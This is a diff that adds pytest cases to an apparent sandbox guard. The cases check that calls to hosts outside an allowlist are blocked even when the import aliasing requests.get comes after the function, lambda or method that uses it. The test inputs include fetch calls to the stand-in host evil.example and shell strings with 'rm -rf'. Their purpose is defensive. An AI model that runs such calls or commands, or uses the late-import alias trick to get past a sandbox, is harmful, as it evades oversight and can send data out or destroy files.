@@ -582,6 +582,54 @@ class TestAliasResolutionOnlyEverAddsCandidates:
     def test_only_an_unconditional_binding_shadows(self, code):
         _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
 
+    @pytest.mark.parametrize(
+        "code",
+        [
+            # A function body runs after the module finishes reading, so an import BELOW the def
+            # is in place by the time the call happens. Resolving as the walk went analysed the
+            # body before the import existed and recognised nothing at all.
+            pytest.param(
+                "def send():\n"
+                '    fetch("http://evil.example/x")\n'
+                "from requests import get as fetch\n"
+                "send()",
+                id = "function_defined_above_its_import",
+            ),
+            pytest.param(
+                'send = lambda: fetch("http://evil.example/x")\n'
+                "from requests import get as fetch\n"
+                "send()",
+                id = "lambda_defined_above_its_import",
+            ),
+            pytest.param(
+                "class A:\n"
+                "    def go(self):\n"
+                '        fetch("http://evil.example/x")\n'
+                "from requests import get as fetch\n"
+                "A().go()",
+                id = "method_defined_above_its_import",
+            ),
+            pytest.param(
+                'def send():\n    get("http://evil.example/x")\nfrom requests import *\nsend()',
+                id = "function_defined_above_a_star_import",
+            ),
+            pytest.param(
+                'def send():\n    r.get("http://evil.example/x")\nimport requests as r\nsend()',
+                id = "function_defined_above_a_module_alias",
+            ),
+        ],
+    )
+    def test_an_import_below_the_body_is_still_resolved(self, code):
+        _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
+
+    def test_a_body_above_its_import_reaching_an_allowed_host_still_runs(self):
+        _ok(
+            "def send():\n"
+            '    fetch("https://huggingface.co/x")\n'
+            "from requests import get as fetch\n"
+            "send()"
+        )
+
     def test_the_upload_shape_is_checked_against_every_candidate(self):
         # `requests.post` with `files=` is an upload; the sorted-first `requests.get` is not, and
         # checking only that one let the file through to an allowlisted host.
@@ -2728,6 +2776,11 @@ class TestEscapedNewlineIsNotACommandBoundary:
             # both lines really are joined.
             pytest.param('echo "ok # x \\\nA=1 rm -rf y"', id = "hash_inside_quotes"),
             pytest.param("echo ab#cd \\\nA=1 echo done", id = "hash_mid_word"),
+            # The backstop has no quoting model, so it steps over an assignment prefix inside
+            # quotes too. That step is only needed when the lex raised and the token walk never
+            # ran, so with a lexable command the walk decides. Checked against bash 5.2.21: this
+            # is one `echo` and the file survives.
+            pytest.param("echo '; A=1 rm -rf x'", id = "assignment_prefix_inside_quotes_is_data"),
         ],
     )
     def test_joined_line_is_one_command(self, command):
